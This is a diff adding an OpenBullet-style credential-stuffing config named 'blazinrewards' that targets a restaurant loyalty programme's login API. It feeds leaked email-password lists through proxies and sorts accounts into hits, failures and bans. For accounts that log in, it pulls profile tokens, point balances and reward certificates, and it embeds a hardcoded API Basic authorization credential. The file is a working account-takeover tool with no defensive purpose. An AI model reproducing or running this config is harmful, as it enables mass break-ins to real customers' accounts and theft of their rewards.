@@ -1,0 +1,74 @@
+[SETTINGS]
+{
+  "Name": "blazinrewards",
+  "SuggestedBots": 1,
+  "LastModified": "2018-06-03T12:25:32.0216743+00:00",
+  "AdditionalInfo": "",
+  "Author": "Doberman",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#POST REQUEST POST "https://bfww-pubapi.epsilon.agilityloyalty.com/api/v1/authorization/profiles/tokens" AutoRedirect=TRUE 
+  CONTENT "grant_type=password&username=<USER>&password=<PASS>&response_type=token" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=utf-8" 
+  HEADER "Accept: *\*" 
+  HEADER "User-Agent: okhttp/3.9.1" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: Basic TU9CQVBJX1BVQkxJQ19VU0VSOk0wOEBwMVB1OGwhYw==" 
+  HEADER "Program-Code: BDUBS" 
+  HEADER "Source-Application: AND" 
+  HEADER "Host: bfww-pubapi.epsilon.agilityloyalty.com" 
+  HEADER "Accept-Language: en-US" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "\"AccessToken\"" 
+  KEYCHAIN Failure OR 
+    KEY "Profile not found" 
+    KEY "The account is frozen." 
+    KEY "UserPasswordInvalid" 
+    KEY "The username/password combination is invalid" 
+  KEYCHAIN Ban OR 
+    KEY "Please consult with your administrator." 
+#LINK PARSE "<SOURCE>" LR "\"ProfileId\": \"" "\"" Recursive=FALSE -> VAR "LINK" "" "" 
+#ATH PARSE "<SOURCE>" LR " \"AccessToken\": \"" "\"" Recursive=FALSE -> VAR "ATHH" "" "" 
+#GET_BALANCE REQUEST GET "https://bfww-pubapi.epsilon.agilityloyalty.com/api/v1/profiles/<LINK>/points/balance?status=A" AutoRedirect=FALSE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=utf-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: okhttp/3.9.1" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host: bfww-pubapi.epsilon.agilityloyalty.com" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "Source-Application: AND" 
+  HEADER "Program-Code: BDUBS" 
+  HEADER "Authorization: OAuth <ATHH>" 
+  HEADER "Environment: PRODUCTION" 
+#capture PARSE "<SOURCE>" LR "\"PointAmount\": " "," Recursive=FALSE -> CAP "Points" "" "" 
+REQUEST GET "https://bfww-pubapi.epsilon.agilityloyalty.com/api/v1/profiles/<LINK>/rewards/certificates?status=A" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: okhttp/3.9.1" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "Source-Application: AND" 
+  HEADER "Program-Code: BDUBS" 
+  HEADER "Authorization: OAuth <ATHH>" 
+  HEADER "Environment: PRODUCTION" 
+PARSE "<SOURCE>" LR "Title\": \"" "\"" Recursive=TRUE -> CAP "Reward Name" "" "" 
+PARSE "<SOURCE>" LR "ExpirationDate\": \"" "\"" Recursive=TRUE -> CAP "Expiration" "" "" 
